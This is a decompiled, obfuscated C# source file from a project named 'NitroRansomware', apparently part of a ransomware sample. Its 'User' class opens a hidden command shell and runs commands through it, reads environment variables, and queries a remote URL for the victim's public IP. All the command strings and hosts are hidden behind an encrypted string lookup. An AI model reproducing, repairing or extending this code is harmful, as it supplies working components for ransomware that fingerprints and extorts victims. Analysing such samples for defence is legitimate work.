using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace NitroRansomware;

internal class User
{
	private class Cmd : IDisposable
	{
		private Process cmdProcess;

		private StreamWriter sw;

		private AutoResetEvent outputWaitHandle;

		private string cmdOutput;

		public Cmd(string cmdPath)
		{
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
			base._002Ector();
			cmdProcess = new Process();
			outputWaitHandle = new AutoResetEvent(initialState: false);
			cmdOutput = string.Empty;
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = cmdPath,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardInput = true,
				CreateNoWindow = true
			};
			cmdProcess.OutputDataReceived += CmdProcess_OutputDataReceived;
			cmdProcess.StartInfo = startInfo;
			cmdProcess.Start();
			sw = cmdProcess.StandardInput;
			cmdProcess.BeginOutputReadLine();
		}

		public void Dispose()
		{
			cmdProcess.Close();
			cmdProcess.Dispose();
			sw.Close();
			sw.Dispose();
		}

		public string ExecuteCommand(string command)
		{
			cmdOutput = string.Empty;
			sw.WriteLine(command);
			sw.WriteLine(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5608));
			outputWaitHandle.WaitOne();
			return cmdOutput;
		}

		private void CmdProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			if (e.Data == null || e.Data == WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5628))
			{
				outputWaitHandle.Set();
			}
			else
			{
				cmdOutput = cmdOutput + e.Data + Environment.NewLine;
			}
		}

		static Cmd()
		{
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
		}
	}

	private static Logs logging;

	public static string GetIdentifier()
	{
		string result = string.Empty;
		try
		{
			using Cmd cmd = new Cmd(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5246));
			string text = cmd.ExecuteCommand(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5264));
			result = text.Split(new char[1] { '\n' })[6];
		}
		catch (Exception ex)
		{
			logging.Error(ex.Message);
		}
		return result;
	}

	public static List<string> GetDetails()
	{
		List<string> list = new List<string>();
		string environmentVariable = Environment.GetEnvironmentVariable(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5314));
		string environmentVariable2 = Environment.GetEnvironmentVariable(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5342));
		list.Add(environmentVariable);
		list.Add(environmentVariable2);
		return list;
	}

	public static string GetIP()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		string result = string.Empty;
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				Task<HttpResponseMessage> async = val.GetAsync(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5362));
				Task<string> task = async.Result.get_Content().ReadAsStringAsync();
				result = task.Result;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			logging.Error(ex.Message);
		}
		return result;
	}

	public User()
	{
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		base._002Ector();
	}

	static User()
	{
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		logging = new Logs(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(234), 0);
	}
}
